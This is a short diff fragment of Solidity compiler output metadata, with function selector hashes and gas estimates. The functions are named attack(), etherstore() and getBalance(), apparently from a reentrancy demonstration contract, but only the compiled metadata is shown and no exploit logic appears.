+        "src": "32:751:0"
+    },
+    "functionHashes": {
+        "attack()": "9e5faafc",
+        "etherstore()": "79c30d2f",
+        "getBalance()": "12065fe0"
+    },
+    "gasEstimates": {
+        "creation": {
+            "codeDepositCost": "108400",
+            "executionCost": "infinite",
+            "totalCost": "infinite"
+        },
+        "external": {
+            "": "infinite",
+            "attack()": "infinite",
+            "etherstore()": "2337",
+            "getBalance()": "146"
+        }
+    }
+}
